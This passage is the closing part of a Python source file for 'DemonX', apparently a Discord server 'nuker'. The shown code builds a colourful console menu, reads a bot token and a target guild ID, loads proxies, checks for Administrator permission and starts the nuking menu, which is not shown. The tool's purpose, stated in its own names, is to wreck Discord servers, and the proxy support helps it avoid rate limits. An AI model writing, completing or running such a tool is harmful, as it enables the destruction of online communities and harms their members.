                            print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}OPERATION COUNTS{Fore.CYAN} {'─' * 51}┐")
                            for key, value in sorted(stats.items()):
                                if not key.endswith('_success') and not key.endswith('_failed'):
                                    print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.YELLOW}{key}:{Fore.CYAN}{' ' * (50 - len(key))} {Fore.GREEN}{value}{Fore.CYAN}{' ' * (10 - len(str(value)))}│")
                            print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                            
                            print(f"{Fore.CYAN}┌─ {Fore.BLUE}{Style.BRIGHT}SUCCESS/FAILURE STATS{Fore.CYAN} {'─' * 46}┐")
                            success_count = sum(v for k, v in stats.items() if k.endswith('_success'))
                            failed_count = sum(v for k, v in stats.items() if k.endswith('_failed'))
                            print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Total Success:{Fore.CYAN}{' ' * 48} {Fore.GREEN}{success_count}{Fore.CYAN}{' ' * (10 - len(str(success_count)))}│")
                            print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.RED}✗ Total Failed:{Fore.CYAN}{' ' * 50} {Fore.RED}{failed_count}{Fore.CYAN}{' ' * (10 - len(str(failed_count)))}│")
                            print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                        else:
                            print(f"{Fore.YELLOW}[*] No operation history found.{Style.RESET_ALL}\n")
                        
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "0" or choice == "00":
                        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.MAGENTA}║{Fore.WHITE}  [*] Shutting Down...{Fore.MAGENTA}{' ' * 45}║")
                        print(f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await self.bot.close()
                        break
                    else:
                        print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Choice! Please select a valid option.{Fore.RED}{' ' * 9}║")
                        print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                except ValueError as e:
                    print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Input: {str(e)[:50]}{Fore.RED}{' ' * (45 - min(50, len(str(e))))}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                except Exception as e:
                    print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Error: {str(e)[:50]}{Fore.RED}{' ' * (50 - min(50, len(str(e))))}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                    logger.error(f"Error in menu: {e}", exc_info=True)
                    import traceback
                    traceback.print_exc()
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Fatal error in menu: {e}")
                logger.error(f"Fatal error in menu: {e}", exc_info=True)
                break
    
    async def run(self):
        """Run the bot"""
        try:
            await self.bot.start(self.token)
        except discord.LoginFailure:
            print(f"{Fore.RED}[!] Invalid bot token!")
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()
        except Exception as e:
            logger.error(f"Error running bot: {e}")
            print(f"{Fore.RED}[!] Fatal error: {e}")
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()

def print_banner():
    """Print banner with neon purple/blue"""
    # Large ASCII art DEMONX in neon purple/blue style
    banner = f"""
{Fore.MAGENTA}{Style.BRIGHT}
 ██████████                                                █████ █████
░░███░░░░███                                              ░░███ ░░███ 
 ░███   ░░███  ██████  █████████████    ██████  ████████   ░░███ ███  
 ░███    ░███ ███░░███░░███░░███░░███  ███░░███░░███░░███   ░░█████   
 ░███    ░███░███████  ░███ ░███ ░███ ░███ ░███ ░███ ░███    ███░███  
 ░███    ███ ░███░░░   ░███ ░███ ░███ ░███ ░███ ░███ ░███   ███ ░░███ 
 ██████████  ░░██████  █████░███ █████░░██████  ████ █████ █████ █████
░░░░░░░░░░    ░░░░░░  ░░░░░ ░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░ ░░░░░ ░░░░░ 
{Fore.CYAN}
{Style.RESET_ALL}
"""
    print(banner)

async def main():
    """Main function"""
    print_banner()
    
    # Load config
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        use_proxy = config.get('proxy', False)
        dry_run = config.get('dry_run', False)
    except:
        use_proxy = False
        dry_run = False
    
    # Get token
    try:
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  Authentication Required{Fore.CYAN}{' ' * 44}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        token = input(f"{Fore.CYAN}║ {Fore.YELLOW}Token{Fore.CYAN}: {Style.RESET_ALL}").strip()
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        if not token:
            print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.WHITE}  [!] Token Required!{Fore.RED}{' ' * 47}║")
            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            input("Press Enter to exit...")
            return
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Fore.YELLOW}[!] Cancelled by user")
        input("Press Enter to exit...")
        return
    
    # Create nuker
    try:
        nuker = DemonXComplete(token, use_proxy, dry_run)
        if use_proxy and nuker.proxy_manager:
            proxy_count = len(nuker.proxy_manager.proxies)
            if proxy_count > 0:
                print(f"{Fore.CYAN}║{Fore.GREEN}  [+] Proxy Support Enabled: {proxy_count} proxies loaded{Fore.CYAN}{' ' * (25 - len(str(proxy_count)))}║")
            else:
                print(f"{Fore.CYAN}║{Fore.YELLOW}  [!] Proxy enabled but no proxies found in proxies.txt{Fore.CYAN}{' ' * 15}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error creating nuker: {e}")
        logger.error(f"Error creating nuker: {e}", exc_info=True)
        input("Press Enter to exit...")
        return
    
    # Validate token (skip actual validation, will be done on connect)
    print(f"{Fore.CYAN}{'═'*70}")
    print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Validating token on connection...{Fore.CYAN}{' ' * 30}║")
    print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    # Get guild ID
    try:
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  Guild Selection{Fore.CYAN}{' ' * 52}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        guild_id = int(input(f"{Fore.CYAN}║ {Fore.YELLOW}Guild ID{Fore.CYAN}: {Style.RESET_ALL}").strip())
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    except (ValueError, EOFError, KeyboardInterrupt):
        print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Guild ID or Cancelled!{Fore.RED}{' ' * 31}║")
        print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input("Press Enter to exit...")
        return
    
    # Wait for ready
    @nuker.bot.event
    async def on_ready():
        try:
            if nuker.bot.user:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Connection Established{Fore.CYAN}{' ' * 41}║")
                print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}BOT INFORMATION{Fore.CYAN} {'─' * 49}┐")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Bot Username:{Fore.CYAN}{' ' * 50}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {nuker.bot.user}{Fore.CYAN}{' ' * (60 - len(str(nuker.bot.user)))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Connected Guilds:{Fore.CYAN}{' ' * 46}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {len(nuker.bot.guilds)}{Fore.CYAN}{' ' * (60 - len(str(len(nuker.bot.guilds))))}│")
                print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                
                guild = nuker.bot.get_guild(guild_id)
                if not guild:
                    print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Guild Not Found!{Fore.RED}{' ' * 46}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Make sure the bot is in the guild{Fore.RED}{' ' * 25}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Verify the Guild ID is correct{Fore.RED}{' ' * 26}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                    input("Press any key to exit...")
                    await nuker.bot.close()
                    return
                
                print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}GUILD INFORMATION{Fore.CYAN} {'─' * 48}┐")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Guild Name:{Fore.CYAN}{' ' * 52}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.name}{Fore.CYAN}{' ' * (60 - len(guild.name))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Guild ID:{Fore.CYAN}{' ' * 54}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.id}{Fore.CYAN}{' ' * (60 - len(str(guild.id)))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Member Count:{Fore.CYAN}{' ' * 49}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.member_count}{Fore.CYAN}{' ' * (60 - len(str(guild.member_count)))}│")
                print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                
                # Validate permissions
                if not await nuker.validate_permissions(guild):
                    print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Insufficient Permissions!{Fore.RED}{' ' * 38}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Bot needs Administrator permissions{Fore.RED}{' ' * 23}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to exit...{Style.RESET_ALL}")
                    await nuker.bot.close()
                    return
                
                print(f"{Fore.CYAN}{'═'*70}")
                print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Initialization Complete - Loading Menu...{Fore.CYAN}{' ' * 20}║")
                print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                await asyncio.sleep(1)
                
                # Start menu in background task
                asyncio.create_task(nuker.run_menu(guild))
        except Exception as e:
            print(f"{Fore.RED}[!] Error in on_ready: {e}")
            logger.error(f"Error in on_ready: {e}", exc_info=True)
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()
            await nuker.bot.close()
            return
    
    try:
        await nuker.run()
    except Exception as e:
        print(f"{Fore.RED}[!] Error running bot: {e}")
        logger.error(f"Error running bot: {e}", exc_info=True)
        print(f"{Fore.YELLOW}[*] Press any key to exit...")
        input()
    finally:
        # Flush history on exit
        if 'nuker' in locals() and nuker:
            nuker.operation_history.flush()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        input("Press Enter to exit...")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")

